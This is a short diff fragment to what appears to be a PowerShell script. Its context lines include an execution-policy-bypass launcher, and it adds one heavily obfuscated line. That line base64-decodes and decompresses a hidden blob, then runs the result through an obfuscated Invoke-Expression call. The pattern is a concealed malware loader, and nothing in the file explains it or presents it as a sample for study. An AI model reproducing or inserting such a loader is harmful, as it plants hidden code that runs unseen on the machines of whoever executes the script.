@@ -40,3 +40,5 @@ pOweRshELL  -exeCUTiONpoLiC BYPAsS   " &( ([STrinG]$VERboSePreFERencE)[1,3]+'x'-
 Powershell use TLS 1.2
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+( nEw-ObjEcT  sySteM.iO.CompReSsIOn.dEFlAtEsTReaM( [SystEm.io.meMoRyStream] [coNveRt]::frOmbASe64stRING( 'dVNRa8IwEP4rebCkZYvcbWMP0jdxWMjimH0YiAwZdDqGWpW1MPffl9xdow4mSi5339335Us0H5tinSqNAOHbIgL6X40UQMF7zvso7ENgqIqJ3wGtAQ9Q8QI5Ms4IXPZYy5rQuEgX8kRrqduPCVVICIvQRlKGNUxuucyafL1ijdAIvOE8kiikqeFjmTq0EbDTlAusPmtH0i4iWEw33Qm8iWXRdkHunQASIdM8O9PbkzPUfz4OxN9ARkP4aP7jogMYnQmDZAoath/FdzGS8BSd3wsKDuWageaT8Y5pRWvUZqJGpnHinOV8wRrYEHoSIchPkmmt8OJOc3k5TmZ2J7Jyos6v7gSWL0Vshs7mpHs/8cqpu7q4w9jl/thp/7GzEDvbyHZKy4kA5S8ir1AcFgfZT9TK7J/sqlQ60Wa//SwOShttplsbooLKPqkrqepWU6bULtQ8zLfakPMNuqHiqtR1h8r1UT1MnkeL4fI7nQ3Hi908VbO3ifsa7Q7zwaDcrNYl3qdp77VfbvblbuXe0yy7vlFZlqmfTB1VX6Wqt92PN4+j2d38qredLic+vIX5lX7R2S8=') ,[SYSteM.iO.COmpressiON.CoMPrESSIonmOdE]::deCOMPresS )| fOREAcH-oBJect {nEw-ObjEcT IO.STrEamrEAdeR( $_,[SYsTEm.texT.encODing]::AScII ) } |foreACh-oBjEcT{$_.ReADtOeND( )} )|.( $pShoME[21]+$Pshome[30]+'x')
+
